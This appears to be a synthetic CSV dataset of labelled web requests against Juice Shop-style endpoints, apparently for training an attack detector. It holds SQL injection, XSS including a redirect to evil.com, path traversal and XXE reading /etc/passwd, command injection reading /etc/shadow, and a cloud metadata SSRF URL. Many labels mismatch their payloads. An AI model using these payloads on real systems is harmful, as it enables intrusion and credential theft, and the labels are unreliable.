attack_type,payload,endpoint,http_method,request_body,source_ip
lfi,search=apple,/redirect,POST,search=apple,192.168.1.230
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.127
lfi,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.241
lfi,page=1,/redirect,GET,page=1,192.168.1.14
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.25
brute,page=1,/#/search,POST,page=1,192.168.1.114
brute,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.128
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.77
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.180
xss,| ls -la /,/#/search,GET,| ls -la /,192.168.1.29
lfi,..\..\..\windows\win.ini,/#/search,POST,..\..\..\windows\win.ini,192.168.1.234
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.242
brute,category=juice,/#/search,POST,category=juice,192.168.1.149
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.249
brute,product=1,/rest/user/login,POST,product=1,192.168.1.198
sqli,"' UNION SELECT username, password FROM Users--",/redirect,GET,"' UNION SELECT username, password FROM Users--",192.168.1.234
lfi,http://169.254.169.254/latest/meta-data/,/ftp,POST,http://169.254.169.254/latest/meta-data/,192.168.1.95
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.14
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.142
brute,category=juice,/#/search,GET,category=juice,192.168.1.158
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.196
brute,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.242
lfi,page=1,/redirect,POST,page=1,192.168.1.106
brute,search=apple,/#/search,GET,search=apple,192.168.1.89
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.78
brute,sort=price,/api/Products,GET,sort=price,192.168.1.19
brute,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.8
lfi,sort=price,/redirect,POST,sort=price,192.168.1.44
lfi,..\..\..\windows\win.ini,/rest/admin/application-configuration,POST,..\..\..\windows\win.ini,192.168.1.233
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.39
sqli,' OR '1'='1' --,/rest/basket,GET,' OR '1'='1' --,192.168.1.194
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.153
brute,page=1,/rest/user/login,GET,page=1,192.168.1.205
lfi,product=1,/redirect,POST,product=1,192.168.1.82
lfi,http://169.254.169.254/latest/meta-data/,/redirect,GET,http://169.254.169.254/latest/meta-data/,192.168.1.111
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.141
lfi,search=apple,/ftp,GET,search=apple,192.168.1.40
brute,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.20
lfi,page=1,/redirect,GET,page=1,192.168.1.26
lfi,& ping -c 10 127.0.0.1 &,/profile,GET,& ping -c 10 127.0.0.1 &,192.168.1.56
xss,| ls -la /,/api/Products,POST,| ls -la /,192.168.1.150
rce,http://169.254.169.254/latest/meta-data/,/rest/user/login,POST,http://169.254.169.254/latest/meta-data/,192.168.1.199
lfi,product=1,/ftp,GET,product=1,192.168.1.236
unknown_anomaly,..\..\..\windows\win.ini,/ftp,GET,..\..\..\windows\win.ini,192.168.1.156
lfi,page=1,/ftp,GET,page=1,192.168.1.7
rce,; cat /etc/shadow,/rest/admin/application-configuration,GET,; cat /etc/shadow,192.168.1.52
xss,<script>document.location='http://evil.com'</script>,/#/search,GET,<script>document.location='http://evil.com'</script>,192.168.1.2
unknown_anomaly,<script>document.location='http://evil.com'</script>,/profile,GET,<script>document.location='http://evil.com'</script>,192.168.1.216
unknown_anomaly,..\..\..\windows\win.ini,/profile,GET,..\..\..\windows\win.ini,192.168.1.40
unknown_anomaly,..\..\..\windows\win.ini,/ftp,GET,..\..\..\windows\win.ini,192.168.1.3
unknown_anomaly,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.236
unknown_anomaly,<img src=x onerror=alert(1)>,/api/Products,POST,<img src=x onerror=alert(1)>,192.168.1.197
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.248
brute,category=juice,/#/search,POST,category=juice,192.168.1.224
lfi,category=juice,/redirect,POST,category=juice,192.168.1.187
xss,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.144
brute,product=1,/api/Products,POST,product=1,192.168.1.112
unknown_anomaly,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,GET,http://169.254.169.254/latest/meta-data/,192.168.1.139
brute,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.139
lfi,& ping -c 10 127.0.0.1 &,/profile,GET,& ping -c 10 127.0.0.1 &,192.168.1.151
lfi,..\..\..\windows\win.ini,/rest/user/login,GET,..\..\..\windows\win.ini,192.168.1.49
xss,| ls -la /,/#/search,GET,| ls -la /,192.168.1.5
lfi,page=1,/profile,POST,page=1,192.168.1.28
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.44
brute,category=juice,/rest/basket,GET,category=juice,192.168.1.169
lfi,& ping -c 10 127.0.0.1 &,/redirect,POST,& ping -c 10 127.0.0.1 &,192.168.1.210
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.70
unknown_anomaly,"' UNION SELECT username, password FROM Users--",/rest/basket,GET,"' UNION SELECT username, password FROM Users--",192.168.1.82
unknown_anomaly,http://169.254.169.254/latest/meta-data/,/redirect,GET,http://169.254.169.254/latest/meta-data/,192.168.1.67
unknown_anomaly,http://169.254.169.254/latest/meta-data/,/api/Products,POST,http://169.254.169.254/latest/meta-data/,192.168.1.6
lfi,page=1,/profile,POST,page=1,192.168.1.219
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.126
xss,| ls -la /,/#/search,POST,| ls -la /,192.168.1.87
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,POST,& ping -c 10 127.0.0.1 &,192.168.1.28
brute,product=1,/rest/basket,POST,product=1,192.168.1.17
xss,| ls -la /,/api/Products,GET,| ls -la /,192.168.1.24
lfi,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.203
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.38
lfi,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.82
lfi,category=juice,/ftp,POST,category=juice,192.168.1.204
unknown_anomaly,& ping -c 10 127.0.0.1 &,/profile,POST,& ping -c 10 127.0.0.1 &,192.168.1.188
unknown_anomaly,' OR '1'='1' --,/rest/admin/application-configuration,GET,' OR '1'='1' --,192.168.1.55
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.27
xss,| ls -la /,/rest/basket,POST,| ls -la /,192.168.1.22
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.110
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,GET,<script>document.location='http://evil.com'</script>,192.168.1.227
lfi,page=1,/ftp,POST,page=1,192.168.1.67
brute,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.90
lfi,product=1,/redirect,POST,product=1,192.168.1.34
brute,search=apple,/api/Products,POST,search=apple,192.168.1.206
brute,product=1,/rest/basket,GET,product=1,192.168.1.246
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.71
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.149
brute,sort=price,/api/Products,GET,sort=price,192.168.1.101
brute,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.226
lfi,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.190
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.16
lfi,search=apple,/profile,POST,search=apple,192.168.1.247
rce,..\..\..\windows\win.ini,/rest/admin/application-configuration,GET,..\..\..\windows\win.ini,192.168.1.182
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.107
lfi,page=1,/redirect,GET,page=1,192.168.1.251
lfi,sort=price,/redirect,GET,sort=price,192.168.1.20
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.187
lfi,..\..\..\windows\win.ini,/ftp,POST,..\..\..\windows\win.ini,192.168.1.54
lfi,search=apple,/redirect,POST,search=apple,192.168.1.97
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.145
lfi,| ls -la /,/redirect,GET,| ls -la /,192.168.1.100
brute,product=1,/#/search,GET,product=1,192.168.1.128
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.13
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.103
brute,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.207
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,GET,http://169.254.169.254/latest/meta-data/,192.168.1.24
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.242
xss,& ping -c 10 127.0.0.1 &,/rest/basket,GET,& ping -c 10 127.0.0.1 &,192.168.1.216
sqli,' OR '1'='1' --,/api/Products,POST,' OR '1'='1' --,192.168.1.177
lfi,sort=price,/profile,POST,sort=price,192.168.1.235
lfi,..\..\..\windows\win.ini,/profile,POST,..\..\..\windows\win.ini,192.168.1.130
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.169
brute,sort=price,/#/search,GET,sort=price,192.168.1.59
lfi,sort=price,/profile,POST,sort=price,192.168.1.236
sqli,"' UNION SELECT username, password FROM Users--",/ftp,GET,"' UNION SELECT username, password FROM Users--",192.168.1.231
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.73
brute,page=1,/api/Products,GET,page=1,192.168.1.137
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,POST,"' UNION SELECT username, password FROM Users--",192.168.1.42
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.172
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.196
brute,product=1,/rest/user/login,POST,product=1,192.168.1.94
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.237
lfi,sort=price,/ftp,POST,sort=price,192.168.1.35
brute,category=juice,/api/Products,GET,category=juice,192.168.1.57
brute,page=1,/rest/basket,GET,page=1,192.168.1.192
lfi,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.94
lfi,sort=price,/redirect,POST,sort=price,192.168.1.15
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.53
brute,category=juice,/api/Products,GET,category=juice,192.168.1.198
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,GET,"' UNION SELECT username, password FROM Users--",192.168.1.177
lfi,product=1,/ftp,POST,product=1,192.168.1.38
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.197
xss,; cat /etc/shadow,/rest/basket,GET,; cat /etc/shadow,192.168.1.241
lfi,product=1,/profile,GET,product=1,192.168.1.97
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.113
brute,product=1,/rest/user/login,POST,product=1,192.168.1.243
brute,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.46
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.184
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.106
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.196
rce,; cat /etc/shadow,/rest/admin/application-configuration,GET,; cat /etc/shadow,192.168.1.230
brute,page=1,/api/Products,POST,page=1,192.168.1.94
lfi,page=1,/profile,GET,page=1,192.168.1.145
lfi,..\..\..\windows\win.ini,/rest/basket,GET,..\..\..\windows\win.ini,192.168.1.253
xss,& ping -c 10 127.0.0.1 &,/api/Products,GET,& ping -c 10 127.0.0.1 &,192.168.1.112
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.98
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.160
lfi,category=juice,/profile,POST,category=juice,192.168.1.183
lfi,..\..\..\windows\win.ini,/rest/admin/application-configuration,POST,..\..\..\windows\win.ini,192.168.1.158
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.7
rce,../../../../etc/passwd,/rest/admin/application-configuration,GET,../../../../etc/passwd,192.168.1.135
lfi,..\..\..\windows\win.ini,/profile,POST,..\..\..\windows\win.ini,192.168.1.232
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.50
brute,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.124
rce,http://169.254.169.254/latest/meta-data/,/api/Products,POST,http://169.254.169.254/latest/meta-data/,192.168.1.185
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,GET,"' UNION SELECT username, password FROM Users--",192.168.1.86
lfi,category=juice,/profile,GET,category=juice,192.168.1.169
lfi,page=1,/profile,POST,page=1,192.168.1.191
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.34
lfi,category=juice,/redirect,POST,category=juice,192.168.1.236
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.134
sqli,' OR '1'='1' --,/rest/basket,POST,' OR '1'='1' --,192.168.1.126
brute,page=1,/rest/user/login,POST,page=1,192.168.1.109
sqli,' OR '1'='1' --,/rest/user/login,GET,' OR '1'='1' --,192.168.1.56
brute,page=1,/api/Products,POST,page=1,192.168.1.194
lfi,page=1,/redirect,GET,page=1,192.168.1.194
brute,page=1,/api/Products,POST,page=1,192.168.1.141
lfi,http://169.254.169.254/latest/meta-data/,/ftp,POST,http://169.254.169.254/latest/meta-data/,192.168.1.15
sqli,' OR '1'='1' --,/redirect,POST,' OR '1'='1' --,192.168.1.162
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.12
brute,page=1,/rest/basket,POST,page=1,192.168.1.87
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.6
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.254
brute,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.84
lfi,page=1,/profile,GET,page=1,192.168.1.237
brute,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.163
lfi,http://169.254.169.254/latest/meta-data/,/profile,POST,http://169.254.169.254/latest/meta-data/,192.168.1.217
lfi,../../../../etc/passwd,/rest/basket,GET,../../../../etc/passwd,192.168.1.23
brute,sort=price,/#/search,GET,sort=price,192.168.1.254
lfi,category=juice,/profile,GET,category=juice,192.168.1.208
lfi,sort=price,/ftp,GET,sort=price,192.168.1.21
lfi,category=juice,/profile,POST,category=juice,192.168.1.142
lfi,sort=price,/ftp,POST,sort=price,192.168.1.141
lfi,category=juice,/ftp,GET,category=juice,192.168.1.211
brute,page=1,/#/search,POST,page=1,192.168.1.253
lfi,search=apple,/ftp,POST,search=apple,192.168.1.97
brute,page=1,/api/Products,POST,page=1,192.168.1.158
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.140
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.56
brute,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.137
lfi,; cat /etc/shadow,/redirect,POST,; cat /etc/shadow,192.168.1.163
sqli,' OR '1'='1' --,/#/search,POST,' OR '1'='1' --,192.168.1.5
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.165
lfi,product=1,/profile,POST,product=1,192.168.1.85
brute,page=1,/rest/basket,POST,page=1,192.168.1.194
sqli,' OR '1'='1' --,/rest/basket,GET,' OR '1'='1' --,192.168.1.216
lfi,category=juice,/redirect,GET,category=juice,192.168.1.11
brute,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.220
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,POST,"' UNION SELECT username, password FROM Users--",192.168.1.107
lfi,product=1,/ftp,POST,product=1,192.168.1.150
brute,category=juice,/#/search,POST,category=juice,192.168.1.21
xss,| ls -la /,/rest/basket,GET,| ls -la /,192.168.1.94
brute,page=1,/api/Products,POST,page=1,192.168.1.140
sqli,' OR '1'='1' --,/rest/basket,GET,' OR '1'='1' --,192.168.1.69
lfi,; cat /etc/shadow,/profile,GET,; cat /etc/shadow,192.168.1.81
lfi,../../../../etc/passwd,/ftp,POST,../../../../etc/passwd,192.168.1.227
brute,category=juice,/#/search,GET,category=juice,192.168.1.64
brute,search=apple,/api/Products,GET,search=apple,192.168.1.103
sqli,' OR '1'='1' --,/redirect,POST,' OR '1'='1' --,192.168.1.80
brute,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.252
lfi,sort=price,/ftp,GET,sort=price,192.168.1.135
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.103
brute,category=juice,/rest/basket,POST,category=juice,192.168.1.59
rce,http://169.254.169.254/latest/meta-data/,/rest/user/login,POST,http://169.254.169.254/latest/meta-data/,192.168.1.246
lfi,page=1,/ftp,POST,page=1,192.168.1.15
brute,page=1,/rest/user/login,GET,page=1,192.168.1.183
xss,<img src=x onerror=alert(1)>,/#/search,POST,<img src=x onerror=alert(1)>,192.168.1.10
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.156
lfi,search=apple,/redirect,GET,search=apple,192.168.1.156
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.155
brute,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.243
rce,; cat /etc/shadow,/rest/user/login,GET,; cat /etc/shadow,192.168.1.61
brute,product=1,/#/search,GET,product=1,192.168.1.166
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,POST,"' UNION SELECT username, password FROM Users--",192.168.1.23
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.52
xss,<script>document.location='http://evil.com'</script>,/rest/basket,GET,<script>document.location='http://evil.com'</script>,192.168.1.140
brute,category=juice,/api/Products,GET,category=juice,192.168.1.76
lfi,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.45
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.170
brute,page=1,/api/Products,POST,page=1,192.168.1.151
brute,page=1,/#/search,GET,page=1,192.168.1.169
brute,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.45
rce,| ls -la /,/rest/user/login,GET,| ls -la /,192.168.1.106
lfi,category=juice,/redirect,GET,category=juice,192.168.1.155
brute,product=1,/rest/basket,GET,product=1,192.168.1.160
sqli,' OR '1'='1' --,/redirect,GET,' OR '1'='1' --,192.168.1.16
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.224
brute,search=apple,/api/Products,POST,search=apple,192.168.1.129
brute,search=apple,/rest/basket,GET,search=apple,192.168.1.32
lfi,search=apple,/profile,GET,search=apple,192.168.1.91
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.92
lfi,product=1,/ftp,GET,product=1,192.168.1.71
brute,search=apple,/rest/basket,GET,search=apple,192.168.1.13
xss,; cat /etc/shadow,/#/search,GET,; cat /etc/shadow,192.168.1.201
brute,product=1,/rest/basket,POST,product=1,192.168.1.7
lfi,..\..\..\windows\win.ini,/redirect,GET,..\..\..\windows\win.ini,192.168.1.105
brute,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.238
brute,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.247
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.184
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.68
brute,search=apple,/rest/user/login,GET,search=apple,192.168.1.85
lfi,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.8
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.185
lfi,page=1,/ftp,GET,page=1,192.168.1.14
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.69
brute,category=juice,/#/search,POST,category=juice,192.168.1.251
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.208
lfi,search=apple,/ftp,POST,search=apple,192.168.1.162
sqli,' OR '1'='1' --,/profile,POST,' OR '1'='1' --,192.168.1.129
brute,sort=price,/api/Products,GET,sort=price,192.168.1.155
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.195
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.54
lfi,& ping -c 10 127.0.0.1 &,/redirect,GET,& ping -c 10 127.0.0.1 &,192.168.1.132
lfi,http://169.254.169.254/latest/meta-data/,/profile,POST,http://169.254.169.254/latest/meta-data/,192.168.1.214
lfi,sort=price,/redirect,POST,sort=price,192.168.1.180
lfi,product=1,/ftp,GET,product=1,192.168.1.182
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.186
xss,& ping -c 10 127.0.0.1 &,/api/Products,POST,& ping -c 10 127.0.0.1 &,192.168.1.221
brute,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.253
lfi,page=1,/profile,GET,page=1,192.168.1.134
brute,page=1,/api/Products,GET,page=1,192.168.1.106
lfi,page=1,/redirect,GET,page=1,192.168.1.137
brute,search=apple,/#/search,GET,search=apple,192.168.1.197
lfi,& ping -c 10 127.0.0.1 &,/ftp,GET,& ping -c 10 127.0.0.1 &,192.168.1.148
lfi,page=1,/ftp,GET,page=1,192.168.1.5
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.114
lfi,../../../../etc/passwd,/rest/basket,GET,../../../../etc/passwd,192.168.1.221
lfi,page=1,/redirect,POST,page=1,192.168.1.53
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.51
brute,search=apple,/rest/user/login,POST,search=apple,192.168.1.157
lfi,| ls -la /,/ftp,POST,| ls -la /,192.168.1.94
lfi,..\..\..\windows\win.ini,/rest/admin/application-configuration,POST,..\..\..\windows\win.ini,192.168.1.184
brute,page=1,/api/Products,GET,page=1,192.168.1.149
sqli,"' UNION SELECT username, password FROM Users--",/profile,GET,"' UNION SELECT username, password FROM Users--",192.168.1.250
lfi,category=juice,/profile,POST,category=juice,192.168.1.231
lfi,page=1,/ftp,GET,page=1,192.168.1.131
lfi,search=apple,/ftp,POST,search=apple,192.168.1.131
sqli,' OR '1'='1' --,/#/search,GET,' OR '1'='1' --,192.168.1.214
brute,page=1,/#/search,POST,page=1,192.168.1.155
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,GET,& ping -c 10 127.0.0.1 &,192.168.1.194
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.253
brute,sort=price,/#/search,POST,sort=price,192.168.1.93
lfi,..\..\..\windows\win.ini,/ftp,POST,..\..\..\windows\win.ini,192.168.1.31
brute,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.157
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.250
xss,; cat /etc/shadow,/#/search,GET,; cat /etc/shadow,192.168.1.189
brute,sort=price,/api/Products,GET,sort=price,192.168.1.88
lfi,..\..\..\windows\win.ini,/api/Products,POST,..\..\..\windows\win.ini,192.168.1.183
rce,http://169.254.169.254/latest/meta-data/,/#/search,GET,http://169.254.169.254/latest/meta-data/,192.168.1.116
brute,product=1,/rest/user/login,GET,product=1,192.168.1.227
brute,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.48
brute,product=1,/rest/basket,POST,product=1,192.168.1.135
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.154
lfi,..\..\..\windows\win.ini,/redirect,GET,..\..\..\windows\win.ini,192.168.1.104
sqli,' OR '1'='1' --,/#/search,GET,' OR '1'='1' --,192.168.1.70
brute,sort=price,/#/search,GET,sort=price,192.168.1.184
brute,category=juice,/rest/basket,POST,category=juice,192.168.1.157
brute,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.108
brute,product=1,/api/Products,POST,product=1,192.168.1.171
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.38
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.129
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,POST,& ping -c 10 127.0.0.1 &,192.168.1.70
brute,page=1,/rest/user/login,GET,page=1,192.168.1.182
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.207
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,GET,"' UNION SELECT username, password FROM Users--",192.168.1.112
rce,; cat /etc/shadow,/rest/admin/application-configuration,GET,; cat /etc/shadow,192.168.1.175
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.153
lfi,sort=price,/profile,POST,sort=price,192.168.1.122
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.179
lfi,sort=price,/profile,POST,sort=price,192.168.1.193
lfi,search=apple,/redirect,POST,search=apple,192.168.1.3
lfi,http://169.254.169.254/latest/meta-data/,/profile,POST,http://169.254.169.254/latest/meta-data/,192.168.1.58
brute,page=1,/rest/basket,POST,page=1,192.168.1.249
lfi,search=apple,/redirect,GET,search=apple,192.168.1.129
